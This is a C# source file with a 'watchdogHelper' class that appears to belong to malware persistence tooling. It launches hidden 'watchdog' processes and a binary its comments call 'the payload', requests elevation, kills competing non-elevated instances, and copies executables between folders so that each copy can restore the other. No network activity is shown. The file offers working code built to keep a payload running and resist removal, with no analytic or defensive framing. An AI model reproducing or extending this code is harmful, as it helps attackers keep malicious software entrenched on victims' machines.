using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;


public class watchdogHelper
    {

        private static bool IsMutexRunning(string mutexName)
        {
            bool isNewInstance;
        try
        {
            // Attempt to create a mutex with the specified name
            using (Mutex mutex = new Mutex(false, "Global\\" + mutexName, out isNewInstance))
            {
                // If a new instance was created, it means no other instance was running
                if (isNewInstance)
                {
                    // Release the mutex so it's not held by this check
                    return false;
                }
                else
                {
                    // If we couldn't create a new instance, another instance is already running
                    return true;
                }
            }
        }
        catch (Exception ex) {
            Log($"Error verifying if mutex is running: {ex.Message}");
            return false;
        }
        }

        private static bool IsProcessRunning(string processName)//does processes by name when mutex cant be used (for the payload)
        {
            try
            {
                // Get a list of processes by name
                processName = processName.Replace(".exe", "");
            }catch (Exception ex){
                Log($"Error getting list of running processes: {ex.Message}");
            }
                Process[] processes = Process.GetProcessesByName(processName); 
                return processes.Length > 0;
        }

        public static void Log(string message)
        {
            if (Config.Debugging)
            { //logs when specified by user in Config
                Console.WriteLine(message);
            }
        }

       

       

        private static void runBinary(string filePath, string arguments = "")
        {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                Verb = "runas" // Request elevated privileges
            };

            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.Start();
            }
        }
        catch (Exception ex) { 
        Log($"Error Running Binary: {ex.Message}");
        }
        }
    public static bool KillProcessById(int pid)
    {
        try
        {
            Process process = Process.GetProcessById(pid);
            process.Kill();
            process.WaitForExit();// waits for exit to avoid issues with claimed mutex
            process.Dispose();
            return true;
        }
        catch (ArgumentException)
        {
            watchdogHelper.Log("No process with the specified PID is running.");
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Failed to kill process: {ex.Message}");
        }
        return false;
    }

    public static void EnsureHighestPriv(bool isNewInstance)
    {
        bool isElevated = watchdogHelper.IsElevated();

        if (!isNewInstance && isElevated)// if this process is admin or system and not a new instance
        {

            watchdogHelper.Log("Another instance of the watchdog is already running.");

            List<Process> processes = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).ToList<Process>(); // get a list of Processes with the same name as the current process

            int? currentID = Process.GetCurrentProcess().Id;

            foreach (Process process in processes){
                if(process.Id == currentID)
                {
                    processes.Remove(process);
                } // remove current process from the list
            }

            if (processes.Count > 1) // kill every other process except one
            {
                for (int i = 1; i < processes.Count; i++)
                {
                    KillProcessById(processes[i].Id);
                }
            }

            int otherProcessID = processes[1].Id;
            if (IsPIDElevated(otherProcessID))
            {
                Environment.Exit(0);
            }
            else
            {
                KillProcessById(otherProcessID);
            }
        }
        else if (!isNewInstance)
        {
            Environment.Exit(0);
        }

        // Call the main watchdog logic
        if (isNewInstance)
        {
            return;
        }
        else
        {
            Environment.Exit(0);
        }
    }
    public static bool IsElevated() // detects whether the program is running as system or administrator
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        bool isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator) || principal.IsInRole(WindowsBuiltInRole.SystemOperator);
        return isElevated;
    }

    private static bool IsPIDElevated(int processHandle)
    {
        IntPtr tokenHandle = IntPtr.Zero;
        try
        {
            if (OpenProcessToken((IntPtr)processHandle, TOKEN_QUERY, out tokenHandle))
            {
                var elevation = new TOKEN_ELEVATION();
                int elevationSize = Marshal.SizeOf(typeof(TOKEN_ELEVATION));
                IntPtr elevationPtr = Marshal.AllocHGlobal(elevationSize);

                try
                {
                    if (GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevation, elevationPtr, elevationSize, out _))
                    {
                        elevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(elevationPtr, typeof(TOKEN_ELEVATION))!;
                        return elevation.TokenIsElevated != 0;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(elevationPtr);
                }
            }
            return false;
        }
        finally
        {
            if (tokenHandle != IntPtr.Zero)
            {
                CloseHandle(tokenHandle);
            }
        }
    }

    // WinAPI functions and constants
    private const int TOKEN_QUERY = 0x0008;

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr processHandle, int desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInfoClass, IntPtr tokenInfo, int tokenInfoLength, out int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private enum TOKEN_INFORMATION_CLASS
    {
        TokenElevation = 20
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_ELEVATION
    {
        public int TokenIsElevated;
    }
    public static void CheckAndRunWatchdog(string watchdogPath, string watchdogName, string mutex)
        {
            if (!IsMutexRunning(mutex)) // uses mutexes to verify whether watchdogs are running
            {
                    runBinary(Path.Combine(watchdogPath, watchdogName));
                }
            }

        public static void CheckAndRunPayload(string payloadPath, string payloadName)
        {
            if (!IsProcessRunning(payloadName)) // uses the filename to verify whether payload is running
        {
                runBinary(Path.Combine(payloadPath, payloadName));
            }
        }

        public static void EnsureDirectoryExists(string dirPath)
        {
            try
            {
                if (!Directory.Exists(dirPath))
                {
                    Directory.CreateDirectory(dirPath);
                }
            }
            catch (Exception ex)
            {
                Log($"An error occurred while creating the directory: {ex.Message}");
            }
        }
    public static void verifyFilePathsSourceAndDest(string destinationPath, string filename) //checks for if file exists then copies it if not
    {
        try
        {
            string currentDirectory = Directory.GetCurrentDirectory();
            string sourcePathFile = Path.Combine(currentDirectory, filename);
            string destPathFile = Path.Combine(destinationPath, filename);


            EnsureDirectoryExists(destinationPath);


            if (File.Exists(destPathFile) && File.Exists(sourcePathFile))
            {
                return;
            }
            else
            {

                if (File.Exists(sourcePathFile))
                {
                    // Copy the .exe to the destination
                    try
                    {
                        File.Copy(sourcePathFile, destPathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {destPathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else if (File.Exists(destPathFile))
                {
                    try
                    {
                        File.Copy(destPathFile, sourcePathFile, overwrite: false);
                        Log($"'{filename}' found and copied to {sourcePathFile}");
                    }
                    catch (Exception ex)
                    {
                        Log($"Error copying file: {ex.Message}");
                    }
                }
                else
                {
                    Log($"'{filename}' not found in the current directory.");
                }
            }
        }
        catch (Exception ex)
        {
            Log($"Error verifying and copying filepaths: {ex.Message}");
        }
    }

}
        
    
